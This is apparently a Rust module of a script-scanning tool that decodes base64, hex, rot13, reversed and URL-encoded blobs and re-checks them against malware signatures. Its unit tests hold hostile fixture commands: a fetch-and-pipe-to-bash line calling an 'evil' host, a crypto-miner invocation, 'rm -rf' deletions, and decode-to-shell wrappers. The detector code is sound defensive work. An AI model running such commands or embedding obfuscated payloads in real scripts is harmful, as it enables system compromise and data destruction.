//! T1.1 decode-and-rescan + T1.4 entropy.
//!
//! Malware hides its payload behind an encoding layer: a base64 or hex blob
//! that a one-liner decodes and pipes into a shell. The textual rules in
//! [`crate::rules`] never see the real command because it is not present as
//! plain text. This pass closes that gap: it pulls candidate encoded blobs out
//! of the script, decodes them, and re-runs the signature engine over the
//! *decoded* bytes.
//!
//! - **`DECODED_THREAT` (Critical):** a decoded blob matched a known-bad rule.
//!   This is high precision — the inner content is itself a detected pattern.
//! - **`ENCODED_BLOB` (Warn, `--max`):** a blob decodes to shell-like content
//!   but no specific rule fired. Suspicious, not proven.
//! - **`HIGH_ENTROPY_BLOB` (Warn, `--max`):** a long, high-entropy token that
//!   looks packed/encrypted, suppressed when the blob already decoded above.
//!
//! Decoding is best-effort and never executes anything; a blob that does not
//! cleanly decode to printable text is ignored.

use crate::report::{Finding, Severity};
use crate::rules;

/// Minimum length of a base64 candidate run worth decoding.
const MIN_B64: usize = 24;
/// Minimum length of a hex candidate run worth decoding (even count).
const MIN_HEX: usize = 40;
/// Shannon-entropy threshold (bits/byte) for `HIGH_ENTROPY_BLOB`.
const ENTROPY_HI: f64 = 4.3;
/// Minimum length before entropy is even considered.
const ENTROPY_MIN_LEN: usize = 40;

/// Maximum nested-decode depth (base64-of-base64-of-…), to bound recursion.
const MAX_DEPTH: u8 = 4;

/// Run the decode pass over `text`. `max` enables the noisier `ENCODED_BLOB`
/// and `HIGH_ENTROPY_BLOB` signals.
pub fn scan(text: &str, max: bool, findings: &mut Vec<Finding>) {
    for (idx, raw) in text.lines().enumerate() {
        scan_line(raw, idx + 1, max, findings);
    }
}

/// Decode every candidate blob on one line (recursing through nested layers),
/// then also re-scan the line under reversible text transforms (rot13, reverse,
/// URL-decode) that hide a plaintext command.
fn scan_line(raw: &str, lineno: usize, max: bool, findings: &mut Vec<Finding>) {
    let mut flagged = false;
    for tok in candidates(raw) {
        flagged |= analyze_blob(tok, 0, max, lineno, findings);
    }

    // Text-layer obfuscation: a command hidden behind rot13 / reversal / URL
    // escaping. Only fire when the transform reveals a rule that the raw line
    // did not already trip (so we are not double-reporting plain text).
    if !flagged {
        let lower_raw = raw.to_ascii_lowercase();
        if first_rule_hit(&lower_raw).is_none() {
            for (kind, transformed) in text_transforms(raw) {
                if let Some(code) = first_rule_hit(&transformed.to_ascii_lowercase()) {
                    findings.push(
                        Finding::at(
                            Severity::Critical,
                            "DECODED_THREAT",
                            format!("{kind}-obfuscated payload decodes to {code}"),
                            lineno,
                        )
                        .with_arg(code.to_string()),
                    );
                    break;
                }
            }
        }
    }
}

/// Decode one candidate blob and, recursively, any blob nested inside the
/// decoded text. Returns whether anything was flagged for this blob.
fn analyze_blob(
    tok: &str,
    depth: u8,
    max: bool,
    lineno: usize,
    findings: &mut Vec<Finding>,
) -> bool {
    if depth >= MAX_DEPTH {
        return false;
    }
    let Some(bytes) = try_decode_bytes(tok) else {
        // Not decodable: at the top level, a long high-entropy token is a packed
        // payload under `--max`.
        if depth == 0 && max {
            if let Some(ent) = high_entropy(tok) {
                findings.push(
                    Finding::at(
                        Severity::Warn,
                        "HIGH_ENTROPY_BLOB",
                        format!("High-entropy blob (entropy {ent:.1}); possible packed payload"),
                        lineno,
                    )
                    .with_arg(format!("{ent:.1}")),
                );
                return true;
            }
        }
        return false;
    };

    // A blob that decodes to compressed/executable bytes is a packed payload.
    if let Some(magic) = container_magic(&bytes) {
        findings.push(
            Finding::at(
                Severity::Critical,
                "COMPRESSED_PAYLOAD",
                format!("Encoded blob unwraps to a {magic} payload"),
                lineno,
            )
            .with_arg(magic.to_string()),
        );
        return true;
    }

    let Some(text) = printable(bytes) else {
        return false;
    };
    let lower = text.to_ascii_lowercase();

    if let Some(code) = first_rule_hit(&lower) {
        findings.push(
            Finding::at(
                Severity::Critical,
                "DECODED_THREAT",
                format!("Encoded payload decodes to a known-bad pattern ({code})"),
                lineno,
            )
            .with_arg(code.to_string()),
        );
        return true;
    }

    // Recurse into anything that looks like a further-encoded layer.
    let mut nested = false;
    for inner in candidates(&text) {
        nested |= analyze_blob(inner, depth + 1, max, lineno, findings);
    }
    if nested {
        return true;
    }

    if max && depth == 0 && looks_executable(&lower) {
        findings.push(Finding::at(
            Severity::Warn,
            "ENCODED_BLOB",
            "Encoded blob decodes to shell-like content",
            lineno,
        ));
        return true;
    }
    false
}

/// First signature-rule code matched on a lower-cased line, if any.
fn first_rule_hit(lower: &str) -> Option<&'static str> {
    let mut hits = Vec::new();
    rules::scan_line(lower, 0, &mut hits);
    hits.first().map(|f| f.code)
}

/// Reversible text transforms that hide a plaintext command: rot13, full
/// reversal (`… | rev`), and URL percent-decoding.
fn text_transforms(line: &str) -> Vec<(&'static str, String)> {
    vec![
        ("rot13", rot13(line)),
        ("reversed", line.chars().rev().collect()),
        ("url-decoded", url_decode(line)),
    ]
}

/// Apply the ROT13 substitution to ASCII letters.
fn rot13(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            'a'..='z' => (((c as u8 - b'a' + 13) % 26) + b'a') as char,
            'A'..='Z' => (((c as u8 - b'A' + 13) % 26) + b'A') as char,
            _ => c,
        })
        .collect()
}

/// Decode `%XX` percent-escapes; leaves malformed escapes untouched.
fn url_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            if let (Some(h), Some(l)) = (
                (b[i + 1] as char).to_digit(16),
                (b[i + 2] as char).to_digit(16),
            ) {
                out.push((h * 16 + l) as u8 as char);
                i += 3;
                continue;
            }
        }
        out.push(b[i] as char);
        i += 1;
    }
    out
}

/// Recognize compression / executable container magic at the head of decoded
/// bytes — a base64 blob that unwraps to one of these is a packed payload.
fn container_magic(b: &[u8]) -> Option<&'static str> {
    if b.starts_with(&[0x1f, 0x8b]) {
        Some("gzip")
    } else if b.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0x00]) {
        Some("xz")
    } else if b.starts_with(b"BZh") {
        Some("bzip2")
    } else if b.starts_with(&[0x28, 0xb5, 0x2f, 0xfd]) {
        Some("zstd")
    } else if b.starts_with(b"\x7fELF") {
        Some("ELF executable")
    } else if b.starts_with(&[0x78, 0x01])
        || b.starts_with(&[0x78, 0x9c])
        || b.starts_with(&[0x78, 0xda])
    {
        Some("zlib")
    } else if b.starts_with(b"PK\x03\x04") {
        Some("zip")
    } else {
        None
    }
}

/// Extract maximal runs of base64/hex-alphabet characters long enough to be a
/// real encoded blob (not an identifier or short flag).
fn candidates(line: &str) -> Vec<&str> {
    let bytes = line.as_bytes();
    let mut out = Vec::new();
    let mut start = None;
    for (i, &b) in bytes.iter().enumerate() {
        if is_blob_char(b) {
            start.get_or_insert(i);
        } else if let Some(s) = start.take() {
            push_candidate(&line[s..i], &mut out);
        }
    }
    if let Some(s) = start {
        push_candidate(&line[s..], &mut out);
    }
    out
}

/// Keep a run only if it could plausibly be base64 or hex.
fn push_candidate<'a>(run: &'a str, out: &mut Vec<&'a str>) {
    let trimmed = run.trim_matches('=');
    let n = trimmed.len();
    if n >= MIN_B64 || (n >= MIN_HEX && is_hex(trimmed)) {
        out.push(trimmed);
    }
}

/// Characters that can appear in a base64 (standard or URL-safe) or hex token.
fn is_blob_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'-' | b'_' | b'=')
}

/// Whether every char is a hex digit and the length is even.
fn is_hex(s: &str) -> bool {
    s.len() % 2 == 0 && !s.is_empty() && s.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Decode a candidate as base64 (standard + URL-safe) or hex, returning the raw
/// bytes. The caller decides whether the bytes are printable text or a binary
/// container.
fn try_decode_bytes(tok: &str) -> Option<Vec<u8>> {
    if is_hex(tok) {
        if let Some(bytes) = hex_decode(tok) {
            return Some(bytes);
        }
    }
    b64_decode(tok).filter(|b| !b.is_empty())
}

/// Accept decoded bytes only if valid UTF-8 with few control characters, so we
/// do not rescan binary noise.
fn printable(bytes: Vec<u8>) -> Option<String> {
    if bytes.len() < 4 {
        return None;
    }
    let s = String::from_utf8(bytes).ok()?;
    let ctrl = s
        .chars()
        .filter(|c| c.is_control() && !matches!(c, '\n' | '\t' | '\r'))
        .count();
    if ctrl * 5 > s.len() {
        return None;
    }
    Some(s)
}

/// Decode a base64 token (standard or URL-safe alphabet), ignoring padding.
fn b64_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim_end_matches('=');
    if s.len() < 4 {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits = 0u32;
    for c in s.bytes() {
        let v: u32 = match c {
            b'A'..=b'Z' => (c - b'A') as u32,
            b'a'..=b'z' => (c - b'a' + 26) as u32,
            b'0'..=b'9' => (c - b'0' + 52) as u32,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            _ => return None,
        };
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
        }
    }
    Some(out)
}

/// Decode an even-length hex string.
fn hex_decode(s: &str) -> Option<Vec<u8>> {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len() / 2);
    for pair in b.chunks_exact(2) {
        let hi = (pair[0] as char).to_digit(16)?;
        let lo = (pair[1] as char).to_digit(16)?;
        out.push((hi * 16 + lo) as u8);
    }
    Some(out)
}

/// Whether decoded text looks like shell/script content (vs. data).
fn looks_executable(lower: &str) -> bool {
    const MARKERS: &[&str] = &[
        "sh ", "bash", "/bin/", "curl", "wget", "eval", "/dev/tcp", "python", "perl ", "chmod ",
        "rm -rf", "system(", "exec(", "$(", "${", "|sh", "| sh", "base64",
    ];
    MARKERS.iter().any(|m| lower.contains(m))
}

/// Shannon entropy of `tok` in bits/byte; `Some(e)` only if it clears the
/// threshold and minimum length.
fn high_entropy(tok: &str) -> Option<f64> {
    if tok.len() < ENTROPY_MIN_LEN {
        return None;
    }
    let mut counts = [0usize; 256];
    for &b in tok.as_bytes() {
        counts[b as usize] += 1;
    }
    let len = tok.len() as f64;
    let mut entropy = 0.0;
    for &c in counts.iter() {
        if c > 0 {
            let p = c as f64 / len;
            entropy -= p * p.log2();
        }
    }
    (entropy > ENTROPY_HI).then_some(entropy)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn b64(s: &str) -> String {
        // Tiny standard-alphabet encoder for fixtures.
        const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let bytes = s.as_bytes();
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let b = [
                chunk[0],
                *chunk.get(1).unwrap_or(&0),
                *chunk.get(2).unwrap_or(&0),
            ];
            let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
            out.push(A[((n >> 18) & 63) as usize] as char);
            out.push(A[((n >> 12) & 63) as usize] as char);
            out.push(if chunk.len() > 1 {
                A[((n >> 6) & 63) as usize] as char
            } else {
                '='
            });
            out.push(if chunk.len() > 2 {
                A[(n & 63) as usize] as char
            } else {
                '='
            });
        }
        out
    }

    #[test]
    fn decodes_and_flags_inner_threat() {
        let payload = b64("curl http://x | xmrig --donate-level 1");
        let line = format!("echo {payload} | base64 -d | sh");
        let mut f = Vec::new();
        scan(&line, false, &mut f);
        assert!(f.iter().any(|x| x.code == "DECODED_THREAT"), "{f:?}");
    }

    #[test]
    fn clean_base64_text_is_not_flagged_by_default() {
        // Decodes to harmless text → no DECODED_THREAT, and ENCODED_BLOB is
        // gated behind --max.
        let payload = b64("the quick brown fox jumps over it");
        let mut f = Vec::new();
        scan(&payload, false, &mut f);
        assert!(f.is_empty(), "{f:?}");
    }

    #[test]
    fn shell_blob_flagged_only_at_max() {
        let payload = b64("curl http://evil/x.sh | bash -c id");
        let mut def = Vec::new();
        scan(&payload, false, &mut def);
        let mut mx = Vec::new();
        scan(&payload, true, &mut mx);
        // Default emits nothing here (no rule hit); --max flags the blob.
        assert!(def.iter().all(|x| x.code != "ENCODED_BLOB"));
        assert!(mx.iter().any(|x| x.code == "ENCODED_BLOB"), "{mx:?}");
    }

    #[test]
    fn hex_roundtrip_decodes() {
        let hex = "726d202d7266202f6574632f70617373776420";
        assert_eq!(
            hex_decode(hex)
                .map(|b| String::from_utf8(b).unwrap())
                .as_deref(),
            Some("rm -rf /etc/passwd ")
        );
    }

    #[test]
    fn short_tokens_ignored() {
        assert!(candidates("x=abc123 y=foobar").is_empty());
    }

    #[test]
    fn nested_base64_is_caught() {
        // base64(base64("… xmrig …")) — two layers deep.
        let inner = b64("run xmrig --donate-level 1 against minexmr now");
        let outer = b64(&inner);
        let mut f = Vec::new();
        scan(&outer, false, &mut f);
        assert!(f.iter().any(|x| x.code == "DECODED_THREAT"), "{f:?}");
    }

    #[test]
    fn base64_wrapped_gzip_is_packed_payload() {
        // base64 of gzip magic bytes (1f 8b 08 …) → COMPRESSED_PAYLOAD.
        let gz = [
            0x1f, 0x8b, 0x08, 0x00, 0x11, 0x22, 0x33, 0x44, 0x00, 0x03, 0xaa, 0xbb, 0xcc, 0xdd,
            0xee, 0xff, 0x01, 0x02, 0x03, 0x04,
        ];
        const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = String::new();
        for chunk in gz.chunks(3) {
            let b = [
                chunk[0],
                *chunk.get(1).unwrap_or(&0),
                *chunk.get(2).unwrap_or(&0),
            ];
            let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
            payload.push(A[((n >> 18) & 63) as usize] as char);
            payload.push(A[((n >> 12) & 63) as usize] as char);
            payload.push(if chunk.len() > 1 {
                A[((n >> 6) & 63) as usize] as char
            } else {
                '='
            });
            payload.push(if chunk.len() > 2 {
                A[(n & 63) as usize] as char
            } else {
                '='
            });
        }
        let mut f = Vec::new();
        scan(
            &format!("echo {payload} | base64 -d | gunzip | sh"),
            false,
            &mut f,
        );
        assert!(f.iter().any(|x| x.code == "COMPRESSED_PAYLOAD"), "{f:?}");
    }

    #[test]
    fn rot13_obfuscated_command_is_revealed() {
        // rot13("xmrig --donate-level minexmr stratum") hides the miner.
        let hidden = rot13("xmrig --donate-level minexmr stratum pool");
        let mut f = Vec::new();
        scan(
            &format!("echo '{hidden}' | tr a-z n-za-m | sh"),
            false,
            &mut f,
        );
        assert!(f.iter().any(|x| x.code == "DECODED_THREAT"), "{f:?}");
    }

    #[test]
    fn url_encoded_helpers() {
        assert_eq!(url_decode("rm%20-rf%20%2f"), "rm -rf /");
        assert_eq!(rot13("nopqr"), "abcde");
    }
}
